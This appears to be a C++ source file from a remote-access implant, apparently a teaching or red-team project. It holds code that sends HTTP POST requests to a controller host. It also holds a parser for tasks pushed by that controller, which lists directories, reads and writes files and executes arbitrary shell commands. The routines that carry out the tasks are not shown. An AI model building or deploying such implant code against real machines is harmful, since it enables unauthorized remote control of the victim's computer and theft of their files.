/*
 * This file is subject to the terms and conditions defined in
 * file 'LICENSE', which is part of this source code package.
 */
#include "implant.h"
#include <sstream>
#include <utility>
#include <boost/uuid/uuid_io.hpp>

// Note: from Chapter 20 of C++ Crash Course
//       c.f. https://github.com/JLospinoso/ccc/blob/master/chapter_20/web_request.cpp
std::string make_request(std::string_view host,
                         std::string_view service,
                         std::string_view payload,
                         boost::asio::io_context& io_context) {
  std::stringstream request_stream;
  request_stream << "POST / HTTP/1.1\r\n"
                    "Host: "
                 << host
                 << "\r\n"
                    "Accept: text/html\r\n"
                    "Accept-Language: en-us\r\n"
                    "Accept-Encoding: identity\r\n"
                    "Connection: close\r\n"
                    "Content-Length: " << payload.size() << "\r\n"
                 << "\r\n"
                 << payload;
  const auto request = request_stream.str();
  boost::asio::ip::tcp::resolver resolver{ io_context };
  const auto endpoints = resolver.resolve(host, service);
  boost::asio::ip::tcp::socket socket{ io_context };
  const auto connected_endpoint = boost::asio::connect(socket, endpoints);
  boost::asio::write(socket, boost::asio::buffer(request));
  std::string response;
  boost::system::error_code ec;
  boost::asio::read(socket, boost::asio::dynamic_buffer(response), ec);
  if(ec && ec.value() != 2)
    throw boost::system::system_error{ ec };
  return response;
}

Task parse_task_from(const boost::property_tree::ptree& task_tree) {
  const auto type = task_tree.get_child("type").get_value<std::string>();
  const auto id_str = task_tree.get_child("id").get_value<std::string>();
  std::stringstream ss{ id_str };
  boost::uuids::uuid id{};
  ss >> id;
  if (type == ListTask::key) {
    return ListTask{ id,
                     task_tree.get_child("path").get_value<std::string>(),
                         task_tree.get_child("depth").get_value<uint8_t>() };
  }
  if (type == GetTask::key) {
    return GetTask{ id, task_tree.get_child("path").get_value<std::string>() };
  }
  if (type == PutTask::key) {
    return PutTask{ id, task_tree.get_child("path").get_value<std::string>(), task_tree.get_child("contents").get_value<std::string>() };
  }
  if (type == ExecuteTask::key) {
    return ExecuteTask{ id, task_tree.get_child("command").get_value<std::string>()};
  }
  std::string error_msg{ "Illegal task type encountered: " };
  error_msg.append(type);
  throw std::logic_error{error_msg};
}

GetTask::GetTask(const boost::uuids::uuid &id, std::string path)
    : id(id), path(std::move(path)) {}

PutTask::PutTask(const boost::uuids::uuid &id, std::string path,
                 std::string contents)
    : id(id), path(std::move(path)), contents(std::move(contents)) {}

ListTask::ListTask(const boost::uuids::uuid &id, std::string path,
                   uint8_t depth)
    : id(id), path(std::move(path)), depth(depth) {}

ExecuteTask::ExecuteTask(const boost::uuids::uuid &id,
                         std::string command)
    : id(id), command(std::move(command)) {}
